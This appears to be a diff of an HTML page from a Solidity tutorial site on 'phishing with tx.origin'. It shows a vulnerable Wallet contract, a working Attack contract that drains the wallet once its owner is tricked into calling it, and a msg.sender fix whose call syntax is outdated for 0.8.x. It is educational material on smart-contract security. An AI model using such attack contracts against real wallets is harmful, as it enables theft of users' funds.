@@ -1,1 +1,57 @@
-<!DOCTYPE html><html class="fa-events-icons-ready" lang="en"><head><meta charset="utf-8"><link href="/solidity-example/favicon.ico" rel="shortcut icon"><meta content="width=device-width,initial-scale=1,shrink-to-fit=yes" name="viewport"><meta content="#000000" name="theme-color"><script src="https://www.google-analytics.com/analytics.js" async type="text/javascript"></script><script src="https://use.fontawesome.com/ba3dde78ee.js"></script><link href="https://www.googletagmanager.com" rel="preconnect"><link href="https://use.fontawesome.com/ba3dde78ee.css" rel="stylesheet" media="all"><link href="/solidity-example/manifest.json" rel="manifest"><title>Solidity by Example</title><script src="https://www.googletagmanager.com/gtag/js?id=UA-133759045-1" async></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-133759045-1")</script><script src="/solidity-example/static/js/main.c873b319.js" defer></script><link href="/solidity-example/static/css/main.2a12f570.css" rel="stylesheet"><link href="https://use.fontawesome.com" rel="preconnect"><link href="https://www.google-analytics.com" rel="preconnect"></head><body class="light"><noscript>You need to enable JavaScript to run this app.</noscript><script>const theme=localStorage.getItem("theme")||"light";document.body.classList.add(theme)</script><div id="root"></div></body></html>
+<!DOCTYPE html><html class="fa-events-icons-ready" lang="en"><head><meta charset="utf-8"><link href="/solidity-example/favicon.ico" rel="shortcut icon"><meta content="width=device-width,initial-scale=1,shrink-to-fit=yes" name="viewport"><meta content="#000000" name="theme-color"><script src="https://www.google-analytics.com/analytics.js" async type="text/javascript"></script><script src="https://use.fontawesome.com/ba3dde78ee.js"></script><link href="https://www.googletagmanager.com" rel="preconnect"><link href="https://use.fontawesome.com/ba3dde78ee.css" rel="stylesheet" media="all"><link href="/solidity-example/manifest.json" rel="manifest"><title>Phishing with tx.origin | Solidity by Example | 0.8.10</title><script src="https://www.googletagmanager.com/gtag/js?id=UA-133759045-1" async></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-133759045-1")</script><script src="/solidity-example/static/js/main.dc5280b7.js" defer></script><link href="/solidity-example/static/css/main.2a12f570.css" rel="stylesheet"><link href="https://use.fontawesome.com" rel="preconnect"><meta content="An example of phishing with tx.origin in Solidity" name="Description" data-react-helmet="true"><link href="https://www.google-analytics.com" rel="preconnect"></head><body class="light"><noscript>You need to enable JavaScript to run this app.</noscript><script>const theme=localStorage.getItem("theme")||"light";document.body.classList.add(theme)</script><div id="root"><div class="App_component__uBhCy"><div class="Header_component__dJEiY"><a href="/"><img alt="logo" class="Header_logo__nZ7K6" src="/solidity-example/static/media/logo.ed2942c41ca20fd4f70a.png"></a><h3 class="Header_header__Lhnr8"><a href="/">Solidity by Example</a><div class="Header_versions__j+f36"><div class="Header_version__4Ju4J">version 0.8.10</div></div></h3><img alt="dark mode" class="Header_dark__TFGN2" src="/solidity-example/static/media/mode-dark.5726a29b11b0940df6a4.png"></div><div class="App_main__nhgh3"><div class="Example_component__4Fiv8"><div class="Example_content__6NsNh"><h2>Phishing with tx.origin</h2><div><h3 id="whats-the-difference-between-msgsender-and-txorigin">What's the difference between <code>msg.sender</code> and <code>tx.origin</code>?</h3><p>If contract A calls B, and B calls C, in C <code>msg.sender</code> is B and <code>tx.origin</code> is A.</p><h3 id="vulnerability">Vulnerability</h3><p>A malicious contract can deceive the owner of a contract into calling a function that only the owner should be able to call.</p><pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.10;</span>
+
+<span class="hljs-comment">/*
+Wallet is a simple contract where only the owner should be able to transfer
+Ether to another address. Wallet.transfer() uses tx.origin to check that the
+caller is the owner. Let's see how we can hack this contract
+*/</span>
+
+<span class="hljs-comment">/*
+1. Alice deploys Wallet with 10 Ether
+2. Eve deploys Attack with the address of Alice's Wallet contract.
+3. Eve tricks Alice to call Attack.attack()
+4. Eve successfully stole Ether from Alice's wallet
+
+What happened?
+Alice was tricked into calling Attack.attack(). Inside Attack.attack(), it
+requested a transfer of all funds in Alice's wallet to Eve's address.
+Since tx.origin in Wallet.transfer() is equal to Alice's address,
+it authorized the transfer. The wallet transferred all Ether to Eve.
+*/</span>
+
+<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Wallet</span> </span>{
+    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;
+
+    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
+        owner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transfer</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> _to, <span class="hljs-keyword">uint</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">tx</span>.<span class="hljs-built_in">origin</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> owner, <span class="hljs-string">"Not owner"</span>);
+
+        (<span class="hljs-keyword">bool</span> sent, ) <span class="hljs-operator">=</span> _to.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: _amount}(<span class="hljs-string">""</span>);
+        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
+    }
+}
+
+<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
+    <span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> <span class="hljs-keyword">public</span> owner;
+    Wallet wallet;
+
+    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">Wallet _wallet</span>) </span>{
+        wallet <span class="hljs-operator">=</span> Wallet(_wallet);
+        owner <span class="hljs-operator">=</span> <span class="hljs-keyword">payable</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>);
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        wallet.<span class="hljs-built_in">transfer</span>(owner, <span class="hljs-keyword">address</span>(wallet).<span class="hljs-built_in">balance</span>);
+    }
+}
+</code></pre><h3 id="preventative-techniques">Preventative Techniques</h3><p>Use <code>msg.sender</code> instead of <code>tx.origin</code></p><pre><code class="language-solidity"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transfer</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> _to, <span class="hljs-keyword">uint256</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+  <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> owner, <span class="hljs-string">"Not owner"</span>);
+
+  (<span class="hljs-keyword">bool</span> sent, ) <span class="hljs-operator">=</span> _to.<span class="hljs-built_in">call</span>.<span class="hljs-built_in">value</span>(_amount)(<span class="hljs-string">""</span>);
+  <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
+}
+</code></pre></div><div class="Example_prevNext__kHIFg"></div><p>Try on <a href="https://remix.ethereum.org" target="__blank">Remix</a></p></div></div></div></div></div></body></html>
